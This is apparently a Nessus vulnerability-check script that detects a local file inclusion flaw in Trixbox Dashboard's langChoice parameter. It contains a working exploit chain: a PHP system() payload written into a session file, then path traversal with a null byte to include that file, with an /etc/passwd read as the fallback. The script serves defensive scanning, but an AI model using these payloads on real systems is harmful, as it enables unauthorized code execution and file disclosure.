#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33445);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2008-6825");
  script_bugtraq_id(30135);
  script_xref(name:"milw0rm", value:"6026");
  script_xref(name:"OSVDB", value:"50421");

  script_name(english:"Trixbox Dashboard user/index.php langChoice Parameter Local File Inclusion");
  script_summary(english:"Tries to read /etc/passwd");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running trixbox dashboard, a PHP-based front-end
for trixbox, an IP-PBX software solution. 

The version of trixbox dashboard installed on the remote host fails to
sanitize user-supplied input to the 'langChoice' parameter of the
'user/index.php' script before using it to include PHP code. 
Regardless of PHP's 'register_globals' setting, an unauthenticated
attacker may be able to leverage this issue to view arbitrary files or
to execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2008-07/0101.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.trixbox.org/devblog/security-vulnerability-2-6-1" );
 script_set_attribute(attribute:"solution", value:
"Update to the lastest version in the SVN repository or the next release
after Trixbox 2.6.1 once it becomes available." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";
file = "/etc/passwd";
file_pat = "root:.*:0:[01]:";


# Loop through directories.
if (thorough_tests) dirs = list_uniq("/user", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Determine if the script exists.
  url = string(dir, "/index.php");

  r = http_send_recv3(method: "GET", item:url, port:port);
  if (isnull(r)) exit(0);

  # If it does...
  if (
    'form name="langForm"' >< r[2] &&
    'name="langChoice"' >< r[2]
  )
  {
    # Try to identify the default language.
    default_language = "";

    pat = 'option value="([^"]+)" selected="selected"';
    matches = egrep(pattern:pat, string:r[2]);
    if (matches)
    {
      foreach match (split(matches))
      {
        match = chomp(match);
        item = eregmatch(pattern:pat, string:match);
        if (!isnull(item))
        {
          default_language = item[1];
          break;
        }
      }
    }
    if (!default_language) default_language = "english";

    report = "";
    vuln = FALSE;

    # Try to exploit the issue to execute a command.
    #
    # - first, inject the PHP code into the session file.
    exploit = string("<?php system('", cmd, "'); ?>%00");
    postdata = string("langChoice=", exploit);

    r = http_send_recv3(method: "POST", item: url, version: 11, data: postdata, port: port,
 add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
    if (isnull(r)) exit(0);

    # - next, figure out our session id.
    cookie = get_http_cookie(name: "PHPSESSID");
    # - now call the session file.
    if (!isnull(cookie))
    {
      exploit = string("../../../../../../../../../../../../tmp/sess_", cookie, "%00");
      postdata2 = string("langChoice=", exploit);

      r = http_send_recv3(method: "POST", item: url, data: postdata2, port: port,
 add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
      if (isnull(r)) exit(0);

      if (egrep(pattern:cmd_pat, string:r[2]))
      {
        if (report_verbosity)
        {
          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd, "' on the remote \n",
            "host using the following URL :\n",
            "\n",
            build_url(port:port, qs:url), "\n",
            "\n",
            "first with the following POST data :\n",
            "\n",
            "  ", str_replace(find:"&", replace:'\n  ', string:postdata), "\n",
            "\n",
            "and then again with the following POST data :\n",
            "\n",
            "  ", str_replace(find:"&", replace:'\n  ', string:postdata2), "\n"
          );
          if (report_verbosity > 1)
          {
            output = "";
            if ("trixbox_Language|s:" >< r[2])
            {
              output = strstr(r[2], "trixbox_Language|s:") - "trixbox_Language|s:";
              output = strstr(output, ':"') - ':"';
              output = output - strstr(output, '\x00');
            }
            if (!output || !egrep(pattern:cmd_pat, string:output)) output = r[2];

            report = string(
              report,
              "\n",
              "This produced the following output :\n",
              "\n",
              "  ", output
            );
          }
        }
        vuln = TRUE;
      }
    }

    # If that failed, try to retrieve a local file.
    if (!vuln)
    {
      exploit = string("../../../../../../../../../../../..", file, "%00");
      postdata3 = string("langChoice=", exploit);

      r = http_send_recv3(method: "POST", item: url, data: postdata3, port: port,
 add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
      if (isnull(r)) exit(0);

      # There's a problem if...
      if (
        # there's an entry for root or...
        egrep(pattern:file_pat, string:r[2]) ||
        # we get an error because magic_quotes was enabled or...
        string("(includes/language/", file, "\\0") >< r[2] ||
        # we get an error claiming the file doesn't exist or...
        string("(includes/language/", file) >< r[2] ||
        # we get an error about open_basedir restriction.
        string("open_basedir restriction in effect. File(", file) >< r[2]
      )
      {
        if (report_verbosity && egrep(pattern:file_pat, string:r[2]))
        {
          output = "";
          if ("<!DOCTYPE" >< r[2]) output = r[2] - strstr(r[2], "<!DOCTYPE");
          if (!egrep(pattern:file_pat, string:output)) output = r[2];

          report = string(
            "\n",
            "Here are the (repeated) contents of the file '", file, "' that\n",
            "Nessus was able to read from the remote host :\n",
            "\n",
            output
          );
        }
        vuln = TRUE;
      }
    }

    # Reset the language in the 'cache/sessionsFile.txt' in case it was changed.
    postdata4 = string("langChoice=", default_language);

    r = http_send_recv3(method: "POST ", item: url, data: postdata4, port: port,
 add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));

    # Issue a report if a problem was found.
    if (vuln)
    {
      if (report) security_hole(port:port, extra:report);
      else security_hole(port);
      exit(0);
    }
  }
}
